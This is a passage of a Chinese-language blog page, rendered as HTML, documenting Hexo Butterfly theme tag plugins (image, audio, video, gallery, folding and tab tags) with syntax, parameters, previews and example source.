url=https://xaoxuu.com, screenshot=https://i.loli.net/2020/08/21/VuSwWZ1xAeUHEBC.jpg, avatar=https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png, description=简约风格 %&#125;</span><br><span class="line">&#123;% site inkss, url=https://inkss.cn, screenshot=https://i.loli.net/2020/08/21/Vzbu3i8fXs6Nh5Y.jpg, avatar=https://cdn.jsdelivr.net/gh/inkss/common@master/static/web/avatar.jpg, description=这是一段关于这个网站的描述文字 %&#125;</span><br><span class="line">&#123;% site MHuiG, url=https://blog.mhuig.top, screenshot=https://i.loli.net/2020/08/22/d24zpPlhLYWX6D1.png, avatar=https://cdn.jsdelivr.net/gh/MHuiG/imgbed@master/data/p.png, description=这是一段关于这个网站的描述文字 %&#125;</span><br><span class="line">&#123;% site Colsrch, url=https://colsrch.top, screenshot=https://i.loli.net/2020/08/22/dFRWXm52OVu8qfK.png, avatar=https://cdn.jsdelivr.net/gh/Colsrch/images/Colsrch/avatar.jpg, description=这是一段关于这个网站的描述文字 %&#125;</span><br><span class="line">&#123;% site Linhk1606, url=https://linhk1606.github.io, screenshot=https://i.loli.net/2020/08/21/3PmGLCKicnfow1x.png, avatar=https://i.loli.net/2020/02/09/PN7I5RJfFtA93r2.png, description=这是一段关于这个网站的描述文字 %&#125;</span><br><span class="line">&#123;% endsitegroup %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="行内图片-inlineimage"><a href="#行内图片-inlineimage" class="headerlink" title="行内图片 inlineimage"></a>行内图片 inlineimage</h1><div class="tabs" id="inlineimage"><ul class="nav-tabs"><li class="tab"><button type="button" data-href="#inlineimage-1">标签语法</button></li><li class="tab"><button type="button" data-href="#inlineimage-2">参数配置</button></li><li class="tab active"><button type="button" data-href="#inlineimage-3">样式预览</button></li><li class="tab"><button type="button" data-href="#inlineimage-4">示例源码</button></li></ul><div class="tab-contents"><div class="tab-item-content" id="inlineimage-1"><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% inlineimage 图片链接, height=高度（可选） %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="inlineimage-2"><ol><li>高度：height=20px</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content active" id="inlineimage-3"><p>这是 <img no-lazy class="inline" src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/0000.gif" style="height:1.5em"/> 一段话。</p><p>这又是 <img no-lazy class="inline" src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/5150.gif" style="height:40px;"/> 一段话。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="inlineimage-4"><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">这是 &#123;% inlineimage https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/0000.gif %&#125; 一段话。</span><br><span class="line"></span><br><span class="line">这又是 &#123;% inlineimage https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/5150.gif, height=40px %&#125; 一段话。</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="单张图片-image"><a href="#单张图片-image" class="headerlink" title="单张图片 image"></a>单张图片 image</h1><div class="tabs" id="image"><ul class="nav-tabs"><li class="tab"><button type="button" data-href="#image-1">标签语法</button></li><li class="tab"><button type="button" data-href="#image-2">参数配置</button></li><li class="tab active"><button type="button" data-href="#image-3">样式预览</button></li><li class="tab"><button type="button" data-href="#image-4">示例源码</button></li></ul><div class="tab-contents"><div class="tab-item-content" id="image-1"><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% image 链接, width=宽度（可选）, height=高度（可选）, alt=描述（可选）, bg=占位颜色（可选） %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="image-2"><ol><li>图片宽度高度：width=300px, height=32px</li><li>图片描述：alt=图片描述（butterfly需要在主题配置文件中开启图片描述）</li><li>占位背景色：bg=#f2f2f2</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content active" id="image-3"><ol><li><p>添加描述：</p><div class="img-wrap"><div class="img-bg"><img class="img" src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg" alt="每天下课回宿舍的路，没有什么故事。"/></div><span class="image-caption">每天下课回宿舍的路，没有什么故事。</span></div></li><li><p>指定宽度：</p><div class="img-wrap"><div class="img-bg"><img class="img" src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg" style="width:400px;"/></div></div></li><li><p>指定宽度并添加描述：</p><div class="img-wrap"><div class="img-bg"><img class="img" src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg" alt="每天下课回宿舍的路，没有什么故事。" style="width:400px;"/></div><span class="image-caption">每天下课回宿舍的路，没有什么故事。</span></div></li><li><p>设置占位背景色：</p><div class="img-wrap"><div class="img-bg" style="background:#1D0C04"><img class="img" src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg" alt="优化不同宽度浏览的观感" style="width:400px;"/></div><span class="image-caption">优化不同宽度浏览的观感</span></div></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="image-4"><ol><li><p>添加描述：</p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% image https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg, alt=每天下课回宿舍的路，没有什么故事。 %&#125;</span><br></pre></td></tr></table></figure></li><li>指定宽度：<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% image https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg, width=400px %&#125;</span><br></pre></td></tr></table></figure></li><li>指定宽度并添加描述：<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% image https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg, width=400px, alt=每天下课回宿舍的路，没有什么故事。 %&#125;</span><br></pre></td></tr></table></figure></li><li>设置占位背景色：<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% image https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg, width=400px, bg=#1D0C04, alt=优化不同宽度浏览的观感 %&#125;</span><br></pre></td></tr></table></figure></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="音频-audio"><a href="#音频-audio" class="headerlink" title="音频 audio"></a>音频 audio</h1><div class="tabs" id="audio"><ul class="nav-tabs"><li class="tab"><button type="button" data-href="#audio-1">标签语法</button></li><li class="tab active"><button type="button" data-href="#audio-2">样式预览</button></li><li class="tab"><button type="button" data-href="#audio-3">示例源码</button></li></ul><div class="tab-contents"><div class="tab-item-content" id="audio-1"><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% audio 音频链接 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content active" id="audio-2"><div class="audio"><audio controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/Lumia1020.mp3' type='audio/mp3'>Your browser does not support the audio tag.</audio></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="audio-3"><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% audio https://github.com/volantis-x/volantis-docs/releases/download/assets/Lumia1020.mp3 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="视频-video"><a href="#视频-video" class="headerlink" title="视频 video"></a>视频 video</h1><div class="tabs" id="video"><ul class="nav-tabs"><li class="tab"><button type="button" data-href="#video-1">标签语法</button></li><li class="tab"><button type="button" data-href="#video-2">参数配置</button></li><li class="tab active"><button type="button" data-href="#video-3">样式预览</button></li><li class="tab"><button type="button" data-href="#video-4">示例源码</button></li></ul><div class="tab-contents"><div class="tab-item-content" id="video-1"><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% video 视频链接 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="video-2"><ol><li>对其方向：left, center, right</li><li>列数：逗号后面直接写列数，支持 1 ～ 4 列。</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content active" id="video-3"><ol><li><p>100%宽度</p><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div></li><li><p>50%宽度</p> <div class="videos" col='2'><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div></div></li><li><p>25%宽度</p><div class="videos" col='4'><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div></div></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="video-4"><ol><li><p>100%宽度</p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG<span class="emphasis">_0341.mov %&#125;</span></span><br></pre></td></tr></table></figure></li><li><p>50%宽度</p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% videos, 2 %&#125;</span><br><span class="line">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG<span class="emphasis">_0341.mov %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_</span>0341.mov %&#125;</span><br><span class="line">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG<span class="emphasis">_0341.mov %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_</span>0341.mov %&#125;</span><br><span class="line">&#123;% endvideos %&#125;</span><br></pre></td></tr></table></figure></li><li><p>25%宽度</p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% videos, 4 %&#125;</span><br><span class="line">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG<span class="emphasis">_0341.mov %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_</span>0341.mov %&#125;</span><br><span class="line">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG<span class="emphasis">_0341.mov %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_</span>0341.mov %&#125;</span><br><span class="line">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG<span class="emphasis">_0341.mov %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_</span>0341.mov %&#125;</span><br><span class="line">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG<span class="emphasis">_0341.mov %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_</span>0341.mov %&#125;</span><br><span class="line">&#123;% endvideos %&#125;</span><br></pre></td></tr></table></figure></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="相册-gallery"><a href="#相册-gallery" class="headerlink" title="相册 gallery"></a>相册 gallery</h1><div class="note blue icon disabled"><i class="note-icon fas fa-bullhorn"></i><p><code>Butterfly</code>自带<code>gallery</code>相册，而且会根据图片大小自动调整排版，效果比<code>Volantis</code>的<code>gallery</code>更好，故不再收录<code>Volantis</code>的<code>gallery</code>标签。</p></div><div class="note flat"><p>以下为<code>Butterfly</code>自带的<code>gallery</code>标签写法。相册图库和相册配合使用。</p></div><div class="tabs" id="gallery"><ul class="nav-tabs"><li class="tab"><button type="button" data-href="#gallery-1">标签语法</button></li><li class="tab"><button type="button" data-href="#gallery-2">参数配置</button></li><li class="tab active"><button type="button" data-href="#gallery-3">样式预览</button></li><li class="tab"><button type="button" data-href="#gallery-4">示例源码</button></li></ul><div class="tab-contents"><div class="tab-item-content" id="gallery-1"><ol><li><p>gallerygroup 相册图库</p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;gallery-group-main&quot;</span>&gt;</span></span></span><br><span class="line">&#123;% galleryGroup name description link img-url %&#125;</span><br><span class="line">&#123;% galleryGroup name description link img-url %&#125;</span><br><span class="line">&#123;% galleryGroup name description link img-url %&#125;</span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br></pre></td></tr></table></figure></li><li><p>gallery 相册</p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% gallery %&#125;</span><br><span class="line">markdown 圖片格式</span><br><span class="line">&#123;% endgallery %&#125;</span><br></pre></td></tr></table></figure></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="gallery-2"><ul><li>gallerygroup 相册图库</li></ul><div class="table-container"><table><thead><tr><th style="text-align:left">参数名</th><th style="text-align:left">释义</th></tr></thead><tbody><tr><td style="text-align:left">name</td><td style="text-align:left">图库名字</td></tr><tr><td style="text-align:left">description</td><td style="text-align:left">图库描述</td></tr><tr><td style="text-align:left">link</td><td style="text-align:left">链接到对应相册的地址</td></tr><tr><td style="text-align:left">img-url</td><td style="text-align:left">图库封面</td></tr></tbody></table></div><div class="note info flat"><p>思维拓展一下，相册图库的实质其实就是个快捷方式，可以自定义添加描述、封面、链接。那么我们未必要把它当做一个相册，完全可以作为一个链接卡片，链接到视频、QQ、友链都是不错的选择。</p></div><ul><li>gallery 相册<br>区别于旧版的Gallery相册,新的Gallery相册会自动根据图片长度进行排版，书写也更加方便，与markdown格式一样。可根据需要插入到相应的md。无需再自己配置长宽。<strong>建议在粘贴时故意使用长短、大小、横竖不一的图片</strong>，会有更好的效果。（尺寸完全相同的图片只会平铺输出，效果很糟糕）</li></ul><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content active" id="gallery-3"><ul><li>gallerygroup 相册图库</li></ul><div class="gallery-group-main">  <figure class="gallery-group">  <img class="gallery-group-img" src= "/img/loading.gif" data-lazy-src='https://cdn.jsdelivr.net/npm/akilar-candyassets/image/1.jpg' alt="Group Image Gallery">  <figcaption>  <div class="gallery-group-name">MC</div>  <p>在Rikkaの六花服务器里留下的足迹</p>  <a href='/gallery/MC/'></a>  </figcaption>  </figure>  <figure class="gallery-group">  <img class="gallery-group-img" src= "/img/loading.gif" data-lazy-src='https://cdn.jsdelivr.net/npm/akilar-candyassets/image/20200907110508327.png' alt="Group Image Gallery">  <figcaption>  <div class="gallery-group-name">Gundam</div>  <p>哦咧哇gundam哒！</p>  <a href='/gallery/Gundam/'></a>  </figcaption>  </figure>  <figure class="gallery-group">  <img class="gallery-group-img" src= "/img/loading.gif" data-lazy-src='https://cdn.jsdelivr.net/npm/akilar-candyassets/image/20200907113116651.png' alt="Group Image Gallery">  <figcaption>  <div class="gallery-group-name">I-am-Akilar</div>  <p>某种意义上也算自拍吧</p>  <a href='/gallery/I-am-Akilar/'></a>  </figcaption>  </figure></div><ul><li>gallery 相册</li></ul><div class="justified-gallery"><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/12/25/Fze9jchtnyJXMHN.jpg" alt=""><br><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/12/25/ryLVePaqkYm4TEK.jpg" alt=""><br><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/12/25/gEy5Zc1Ai6VuO4N.jpg" alt=""><br><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/12/25/d6QHbytlSYO4FBG.jpg" alt=""><br><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/12/25/6nepIJ1xTgufatZ.jpg" alt=""><br><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/12/25/E7Jvr4eIPwUNmzq.jpg" alt=""><br><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/12/25/mh19anwBSWIkGlH.jpg" alt=""><br><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/12/25/2tu9JC8ewpBFagv.jpg" alt=""></p>          </div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="gallery-4"><div class="note info flat"><p>对于很多同学提问的<code>gallerygroup</code>和<code>gallery</code>相册页的链接问题。这里说下我个人的使用习惯。<br>一般使用相册图库的话，可以在导航栏加一个gallery的page(<strong>使用指令<code>hexo new page gallery</code>添加</strong>)，里面放相册图库作为封面。然后在<code>[Blogroot]/source/gallery/</code>下面建立相应的文件夹，例如若按照这里的示例，若欲使用<code>/gallery/MC/</code>路径访问MC相册，则需要新建<code>[Blogroot]/source/gallery/MC/index.md</code>，并在里面填入<code>gallery</code>相册内容。</p></div><ol><li><p>gallerygroup 相册图库</p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;gallery-group-main&quot;</span>&gt;</span></span></span><br><span class="line">&#123;% galleryGroup MC 在Rikkaの六花服务器里留下的足迹 &#x27;/gallery/MC/&#x27; https://cdn.jsdelivr.net/npm/akilar-candyassets/image/1.jpg %&#125;</span><br><span class="line">&#123;% galleryGroup Gundam 哦咧哇gundam哒！ &#x27;/gallery/Gundam/&#x27; https://cdn.jsdelivr.net/npm/akilar-candyassets/image/20200907110508327.png %&#125;</span><br><span class="line">&#123;% galleryGroup I-am-Akilar 某种意义上也算自拍吧 &#x27;/gallery/I-am-Akilar/&#x27; https://cdn.jsdelivr.net/npm/akilar-candyassets/image/20200907113116651.png %&#125;</span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br></pre></td></tr></table></figure></li><li><p>gallery 相册</p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% gallery %&#125;</span><br><span class="line">![](https://i.loli.net/2019/12/25/Fze9jchtnyJXMHN.jpg)</span><br><span class="line">![](https://i.loli.net/2019/12/25/ryLVePaqkYm4TEK.jpg)</span><br><span class="line">![](https://i.loli.net/2019/12/25/gEy5Zc1Ai6VuO4N.jpg)</span><br><span class="line">![](https://i.loli.net/2019/12/25/d6QHbytlSYO4FBG.jpg)</span><br><span class="line">![](https://i.loli.net/2019/12/25/6nepIJ1xTgufatZ.jpg)</span><br><span class="line">![](https://i.loli.net/2019/12/25/E7Jvr4eIPwUNmzq.jpg)</span><br><span class="line">![](https://i.loli.net/2019/12/25/mh19anwBSWIkGlH.jpg)</span><br><span class="line">![](https://i.loli.net/2019/12/25/2tu9JC8ewpBFagv.jpg)</span><br><span class="line">&#123;% endgallery %&#125;</span><br></pre></td></tr></table></figure></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="折叠框-folding"><a href="#折叠框-folding" class="headerlink" title="折叠框 folding"></a>折叠框 folding</h1><div class="note blue icon disabled"><i class="note-icon fas fa-bullhorn"></i><p><code>Butterfly</code>虽然也有内置折叠框<code>hideToggle</code>标签，但是<code>Volantis</code>的<code>folding</code>折叠框更好看一些。</p></div><div class="tabs" id="folding"><ul class="nav-tabs"><li class="tab"><button type="button" data-href="#folding-1">标签语法</button></li><li class="tab"><button type="button" data-href="#folding-2">配置参数</button></li><li class="tab active"><button type="button" data-href="#folding-3">样式预览</button></li><li class="tab"><button type="button" data-href="#folding-4">示例源码</button></li></ul><div class="tab-contents"><div class="tab-item-content" id="folding-1"><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% folding 参数（可选）, 标题 %&#125;</span><br><span class="line">![](https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper/abstract/41F215B9-261F-48B4-80B5-4E86E165259E.jpeg)</span><br><span class="line">&#123;% endfolding %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="folding-2"><ol><li>颜色：blue, cyan, green, yellow, red</li><li>状态：状态填写 open 代表默认打开。</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content active" id="folding-3"><details class="folding-tag" ><summary> 查看图片测试 </summary>              <div class='content'>              <p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper/abstract/41F215B9-261F-48B4-80B5-4E86E165259E.jpeg" alt=""></p>              </div>            </details><details class="folding-tag" cyan open><summary> 查看默认打开的折叠框 </summary>              <div class='content'>              <p>这是一个默认打开的折叠框。</p>              </div>            </details><details class="folding-tag" green><summary> 查看代码测试 </summary>              <div class='content'>              <figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">![](https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper/abstract/41F215B9-261F-48B4-80B5-4E86E165259E.jpeg)</span><br></pre></td></tr></table></figure>              </div>            </details><details class="folding-tag" yellow><summary> 查看列表测试 </summary>              <div class='content'>              <ul><li>haha</li><li>hehe</li></ul>              </div>            </details><details class="folding-tag" red><summary> 查看嵌套测试 </summary>              <div class='content'>              <details class="folding-tag" blue><summary> 查看嵌套测试2 </summary>              <div class='content'>              <details class="folding-tag" ><summary> 查看嵌套测试3 </summary>              <div class='content'>              <p>hahaha <span><img src= "/img/loading.gif" data-lazy-src='https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/tieba/%E6%BB%91%E7%A8%BD.png' style='height:24px'></span></p>              </div>            </details>              </div>            </details>              </div>            </details><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="folding-4"><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% folding 查看图片测试 %&#125;</span><br><span class="line"></span><br><span class="line">![](https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper/abstract/41F215B9-261F-48B4-80B5-4E86E165259E.jpeg)</span><br><span class="line"></span><br><span class="line">&#123;% endfolding %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% folding cyan open, 查看默认打开的折叠框 %&#125;</span><br><span class="line"></span><br><span class="line">这是一个默认打开的折叠框。</span><br><span class="line"></span><br><span class="line">&#123;% endfolding %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% folding green, 查看代码测试 %&#125;</span><br><span class="line">假装这里有代码块（代码块没法嵌套代码块）</span><br><span class="line">&#123;% endfolding %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% folding yellow, 查看列表测试 %&#125;</span><br><span class="line"></span><br><span class="line"><span class="bullet">-</span> haha</span><br><span class="line"><span class="bullet">-</span> hehe</span><br><span class="line"></span><br><span class="line">&#123;% endfolding %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% folding red, 查看嵌套测试 %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% folding blue, 查看嵌套测试2 %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% folding 查看嵌套测试3 %&#125;</span><br><span class="line"></span><br><span class="line">hahaha <span class="xml"><span class="tag">&lt;<span class="name">span</span>&gt;</span></span><span class="xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/tieba/%E6%BB%91%E7%A8%BD.png&#x27;</span> <span class="attr">style</span>=<span class="string">&#x27;height:24px&#x27;</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">&#123;% endfolding %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% endfolding %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% endfolding %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="分栏-tab"><a href="#分栏-tab" class="headerlink" title="分栏 tab"></a>分栏 tab</h1><div class="note blue icon disabled"><i class="note-icon fas fa-bullhorn"></i><p><code>Butterfly</code>的<code>tab</code>标签和<code>Volantis</code>的<code>tab</code>标签都是移值自<code>NexT</code>主题，所以写法和效果一模一样。</p></div><div class="tabs" id="folding"><ul class="nav-tabs"><li class="tab"><button type="button" data-href="#folding-1">标签语法</button></li><li class="tab"><button type="button" data-href="#folding-2">配置参数</button></li><li class="tab active"><button type="button" data-href="#folding-3">样式预览</button></li><li class="tab"><button type="button" data-href="#folding-4">示例源码</button></li></ul><div class="tab-contents"><div class="tab-item-content" id="folding-1"><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% tabs Unique name, [index] %&#125;</span><br><span class="line">&lt;!-- tab [Tab caption] [@icon] --&gt;</span><br><span class="line">Any content (support inline tags too).</span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line">&#123;% endtabs %&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="folding-2"><ol><li>Unique name :<ul><li>选项卡块标签的唯一名称，不带逗号。</li><li>将在#id中用作每个标签及其索引号的前缀。</li><li>如果名称中包含空格，则对于生成#id，所有空格将由破折号代替。</li><li>仅当前帖子/页面的URL必须是唯一的！</li></ul></li><li>[index]:<ul><li>活动选项卡的索引号。</li><li>如果未指定，将选择第一个标签（1）。</li><li>如果index为-1，则不会选择任何选项卡。</li><li>可选参数。</li></ul></li><li>[Tab caption]:<ul><li>当前选项卡的标题。</li><li>如果未指定标题，则带有制表符索引后缀的唯一名称将用作制表符的标题。</li><li>如果未指定标题，但指定了图标，则标题将为空。</li><li>可选参数。</li></ul></li><li>[@icon]:<ul><li>FontAwesome图标名称（全名，看起来像“ fas fa-font”）</li><li>可以指定带空格或不带空格；</li><li>例如’Tab caption @icon’ 和 ‘Tab caption@icon’.</li><li>可选参数。</li></ul></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content active" id="folding-3"><div class="note primary flat"><p>Demo 1 - 预设选择第一个【默认】</p></div><div class="tabs" id="test1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test1-1">test1 1</button></li><li class="tab"><button type="button" data-href="#test1-2">test1 2</button></li><li class="tab"><button type="button" data-href="#test1-3">test1 3</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test1-1"><p><strong>This is Tab 1.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div 